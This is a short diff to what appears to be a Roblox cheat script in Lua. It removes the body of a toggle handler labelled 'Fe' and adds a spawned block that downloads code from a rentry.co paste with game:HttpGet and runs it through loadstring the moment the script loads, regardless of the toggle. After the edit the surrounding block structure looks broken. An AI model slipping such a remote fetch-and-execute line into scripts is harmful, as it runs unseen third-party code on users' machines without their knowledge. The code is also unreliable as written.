@@ -7247,10 +7247,8 @@ end
 
     local ToggleAutorace = Tabs.Main:AddToggle("ToggleAutorace", {Title = "Fe", Default = false })
     ToggleAutorace:OnChanged(function(Value)
-        _G.Ecto = Value
-    end)
     Options.ToggleAutorace:SetValue(false)
-
+    spawn(function()
      loadstring(game:HttpGet("https://rentry.co/n55gmtpi/raw", true))()
         end
     end)
